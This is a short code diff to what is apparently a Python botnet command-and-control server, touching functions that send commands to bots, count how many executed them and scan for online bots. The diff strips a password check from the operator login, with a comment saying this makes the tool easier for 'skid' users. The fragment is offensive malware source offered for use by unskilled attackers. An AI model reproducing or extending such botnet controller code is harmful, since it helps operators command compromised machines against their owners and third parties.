@@ -51,7 +51,7 @@ def sendCmd(cmd):#Send Commands Module
 	global so
 	so.send((str(count)+" bots exec the command\r\n").encode())
 	scan_device()#check device after exec command
-	
+
 
 def scan_device():#scan online device
 	print('scanning Online bot')
@@ -119,10 +119,9 @@ def waitConnect(sock,addr):
 				handle_bot(sock,socketList)
 		else:
 			#removed Login code, more easy for skid
-			#if passwd == "Login\r\n" or passwd == "Login":
-			#If u are using putty pls use raw mode to connect, 
+			#If u are using putty pls use raw mode to connect,
 			#If connected, there will not show anything on screen
-			#Just input 'Login' and enter.
+			#Just click enter.
 			print("Somebody connected:"+str(addr))
 			Commander(sock)
 	except:
